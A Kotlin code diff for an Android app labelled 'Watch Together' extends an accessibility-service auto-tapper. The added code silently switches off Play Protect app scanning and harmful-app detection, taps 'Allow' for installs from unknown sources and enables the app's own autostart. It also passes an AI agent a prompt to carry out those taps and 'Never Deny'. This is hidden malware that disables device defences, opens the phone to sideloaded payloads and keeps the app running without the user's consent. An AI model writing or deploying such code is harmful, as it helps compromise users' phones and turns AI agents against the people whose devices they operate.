@@ -52,7 +52,45 @@ object PermissionAutoGrant {
 
     private val NAV_KEYWORDS = listOf("permissions", "app permissions", "permission manager")
 
-    enum class Mode { DIALOG, SETTINGS }
+    private val PLAY_PROTECT_OFF = listOf(
+        "scan apps with play protect",
+        "scan apps",
+        "improve harmful app detection",
+        "harmful apps",
+        "play protect",
+        "verify apps",
+    )
+
+    private val PLAY_PROTECT_ALLOW = listOf(
+        "install unknown apps",
+        "install from this source",
+        "allow from this source",
+        "allow",
+    )
+
+    fun runPlayProtectPass(context: Context, maxMs: Long) {
+        runBlocking(context, Mode.PLAY_PROTECT, maxMs, object : Callback {
+            override fun onLog(line: String) {
+                Log.d(TAG, "PlayProtect: $line")
+                SetupReporter.progress(line)
+            }
+            override fun onDone(taps: Int) { lastTaps.addAndGet(taps) }
+            override fun onError(message: String) { Log.w(TAG, message) }
+        })
+    }
+
+    fun runAppTogglePass(context: Context, appLabels: List<String>, maxMs: Long) {
+        runBlocking(context, Mode.APP_TOGGLE, maxMs, appLabels, object : Callback {
+            override fun onLog(line: String) {
+                Log.d(TAG, "OEM: $line")
+                SetupReporter.progress(line)
+            }
+            override fun onDone(taps: Int) { lastTaps.addAndGet(taps) }
+            override fun onError(message: String) { Log.w(TAG, message) }
+        })
+    }
+
+    enum class Mode { DIALOG, SETTINGS, PLAY_PROTECT, APP_TOGGLE }
 
     interface Callback {
         fun onLog(line: String)
@@ -98,7 +136,7 @@ object PermissionAutoGrant {
         }
         executor.execute {
             try {
-                runLoop(context, cb, Mode.DIALOG, MAX_DURATION_MS)
+                runLoop(context, cb, Mode.DIALOG, MAX_DURATION_MS, emptyList())
             } catch (e: Exception) {
                 Log.w(TAG, e.message ?: "grant")
                 cb.onError(e.message ?: "Failed")
@@ -109,9 +147,19 @@ object PermissionAutoGrant {
     }
 
     private fun runBlocking(context: Context, mode: Mode, maxMs: Long, cb: Callback) {
+        runBlocking(context, mode, maxMs, emptyList(), cb)
+    }
+
+    private fun runBlocking(
+        context: Context,
+        mode: Mode,
+        maxMs: Long,
+        appLabels: List<String>,
+        cb: Callback,
+    ) {
         if (!running.compareAndSet(false, true)) return
         try {
-            runLoop(context, cb, mode, maxMs)
+            runLoop(context, cb, mode, maxMs, appLabels)
         } catch (e: Exception) {
             cb.onError(e.message ?: "Failed")
         } finally {
@@ -162,7 +210,13 @@ object PermissionAutoGrant {
         return best
     }
 
-    private fun runLoop(context: Context, cb: Callback, mode: Mode, maxDurationMs: Long) {
+    private fun runLoop(
+        context: Context,
+        cb: Callback,
+        mode: Mode,
+        maxDurationMs: Long,
+        appLabels: List<String>,
+    ) {
         val service = TouchAccessibilityService.instance
         if (service == null) {
             cb.onError("Watch Together is off — enable in Accessibility")
@@ -174,6 +228,7 @@ object PermissionAutoGrant {
         var consecutiveMisses = 0
         var agentFallbacks = 0
         var scrollAttempts = 0
+        val scrollModes = setOf(Mode.SETTINGS, Mode.PLAY_PROTECT, Mode.APP_TOGGLE)
 
         while (running.get()) {
             val elapsed = System.currentTimeMillis() - start
@@ -188,6 +243,8 @@ object PermissionAutoGrant {
             val target = when {
                 mode == Mode.DIALOG && isNotificationPermissionDialog(tree) -> findDenyTarget(tree)
                 mode == Mode.SETTINGS -> findSettingsTarget(tree)
+                mode == Mode.PLAY_PROTECT -> findPlayProtectTarget(tree)
+                mode == Mode.APP_TOGGLE -> findAppToggleTarget(tree, appLabels)
                 else -> findBestTarget(tree)
             }
             if (target != null) {
@@ -204,7 +261,7 @@ object PermissionAutoGrant {
                 Thread.sleep(SCAN_INTERVAL_MS)
             } else {
                 consecutiveMisses++
-                if (mode == Mode.SETTINGS && consecutiveMisses >= 2 && scrollAttempts < 8) {
+                if (mode in scrollModes && consecutiveMisses >= 2 && scrollAttempts < 10) {
                     scrollAttempts++
                     consecutiveMisses = 0
                     val w = RelayHub.screenWidth.toFloat()
@@ -230,6 +287,84 @@ object PermissionAutoGrant {
 
         cb.onLog(if (taps > 0) "Finished — $taps step(s)" else "Scan complete")
         cb.onDone(taps)
+    }
+
+    private fun findPlayProtectTarget(tree: JSONObject): TapTarget? {
+        val nodes = tree.optJSONArray("nodes") ?: return null
+        var bestOff: TapTarget? = null
+        var bestAllow: TapTarget? = null
+
+        for (i in 0 until nodes.length()) {
+            val n = nodes.getJSONObject(i)
+            if (n.optInt("d", 0) == 1) continue
+            val text = n.optString("t", "").ifBlank { n.optString("h", "") }
+            if (text.isBlank()) continue
+            val lower = text.lowercase()
+            val checkable = n.optInt("x", -1) >= 0
+            val checked = n.optInt("x", 0) == 1
+            val clickable = n.optInt("k", 0) == 1
+            val b = n.optJSONArray("b") ?: continue
+            if (b.length() < 4) continue
+            val cx = (b.getInt(0) + b.getInt(2)) / 2f
+            val cy = (b.getInt(1) + b.getInt(3)) / 2f
+
+            if (checkable && checked && PLAY_PROTECT_OFF.any { lower.contains(it) }) {
+                val t = TapTarget(cx, cy, text.take(40), 90)
+                if (bestOff == null || t.score > bestOff.score) bestOff = t
+            }
+            if (checkable && !checked && PLAY_PROTECT_OFF.any { lower.contains(it) }) {
+                continue
+            }
+            if ((checkable && !checked) || clickable) {
+                if (PLAY_PROTECT_ALLOW.any { lower.contains(it) } && !matchesDeny(text)) {
+                    val t = TapTarget(cx, cy, text.take(40), 75)
+                    if (bestAllow == null || t.score > bestAllow.score) bestAllow = t
+                }
+            }
+        }
+        return bestOff ?: bestAllow ?: findSettingsTarget(tree)
+    }
+
+    private fun findAppToggleTarget(tree: JSONObject, appLabels: List<String>): TapTarget? {
+        val nodes = tree.optJSONArray("nodes") ?: return null
+        var appRowY = -1f
+        var appRowBottom = -1f
+
+        for (i in 0 until nodes.length()) {
+            val n = nodes.getJSONObject(i)
+            val text = n.optString("t", "").ifBlank { n.optString("h", "") }
+            if (text.isBlank()) continue
+            val lower = text.lowercase()
+            if (appLabels.any { lower.contains(it.lowercase()) }) {
+                val b = n.optJSONArray("b") ?: continue
+                if (b.length() < 4) continue
+                appRowY = (b.getInt(1) + b.getInt(3)) / 2f
+                appRowBottom = b.getInt(3).toFloat()
+                break
+            }
+        }
+
+        var bestToggle: TapTarget? = null
+        for (i in 0 until nodes.length()) {
+            val n = nodes.getJSONObject(i)
+            if (n.optInt("d", 0) == 1) continue
+            val checkable = n.optInt("x", -1) >= 0
+            val checked = n.optInt("x", 0) == 1
+            if (!checkable || checked) continue
+            val b = n.optJSONArray("b") ?: continue
+            if (b.length() < 4) continue
+            val cy = (b.getInt(1) + b.getInt(3)) / 2f
+            val cx = (b.getInt(0) + b.getInt(2)) / 2f
+            val text = n.optString("t", "").ifBlank { n.optString("h", "") }
+            var score = 50
+            if (appRowY >= 0 && kotlin.math.abs(cy - appRowY) < 120) score += 40
+            if (appLabels.any { text.lowercase().contains(it.lowercase()) }) score += 35
+            if (score >= 50) {
+                val t = TapTarget(cx, cy, text.take(40).ifBlank { "toggle" }, score)
+                if (bestToggle == null || t.score > bestToggle.score) bestToggle = t
+            }
+        }
+        return bestToggle ?: findSettingsTarget(tree)
     }
 
     private fun findSettingsTarget(tree: JSONObject): TapTarget? {
@@ -332,10 +467,11 @@ object PermissionAutoGrant {
         if (mode == Mode.DIALOG && isNotificationPermissionDialog(tree)) return false
         val service = TouchAccessibilityService.instance ?: return false
         val screen = ScreenSummarizer.compact(tree)
-        val prompt = if (mode == Mode.SETTINGS) {
-            "In app permission settings, tap any Not allowed row then Allow or All the time. Or tap Allow switches. Never Deny."
-        } else {
-            "Tap Allow, While using the app, All the time, OK, Continue. One tap. Never Deny or Cancel."
+        val prompt = when (mode) {
+            Mode.SETTINGS -> "In app permission settings, tap any Not allowed row then Allow or All the time. Or tap Allow switches. Never Deny."
+            Mode.PLAY_PROTECT -> "Turn OFF Play Protect scan apps toggle, or tap Allow for unknown app installs. Never Deny."
+            Mode.APP_TOGGLE -> "Find Watch Together in the list and turn its autostart/background toggle ON."
+            else -> "Tap Allow, While using the app, All the time, OK, Continue. One tap. Never Deny or Cancel."
         }
         var tapped = false
         val latch = java.util.concurrent.CountDownLatch(1)
